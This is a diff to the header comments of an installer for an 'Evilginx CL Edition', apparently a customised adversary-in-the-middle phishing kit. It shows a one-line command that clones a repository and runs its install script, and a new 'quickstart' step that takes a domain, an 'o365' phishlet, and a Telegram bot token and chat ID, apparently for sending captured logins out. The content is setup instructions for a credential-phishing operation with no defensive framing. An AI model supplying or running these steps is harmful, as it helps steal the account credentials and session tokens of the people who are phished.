@@ -3,16 +3,16 @@
 # Evilginx CL Edition — One-Command VPS Installer
 # ═══════════════════════════════════════════════════════════════
 #
-# One-liner (from a fresh Ubuntu/Debian VPS):
+# STEP 1 - Install (fresh VPS or reinstall):
 #
-#   apt update && apt install -y git && git clone https://github.com/saroula01/master /opt/evilginx && cd /opt/evilginx && chmod +x install.sh && ./install.sh
+#   apt update && apt install -y git && rm -rf /opt/evilginx && git clone https://github.com/saroula01/master /opt/evilginx && cd /opt/evilginx && chmod +x install.sh && ./install.sh
 #
-# Or if already cloned:
-#   chmod +x install.sh && sudo ./install.sh
+# STEP 2 - Quick setup (run inside evilginx):
 #
-# After install, you only need to configure:
-#   1. config domain <your_domain>
-#   2. config telegram <bot_token> <chat_id>
+#   quickstart <domain> <phishlet> <bot_token> <chat_id>
+#
+# Example:
+#   quickstart example.com o365 123456789:AAxxxxxxxxxxxxxxxxxxxx 987654321
 #
 # ═══════════════════════════════════════════════════════════════
 
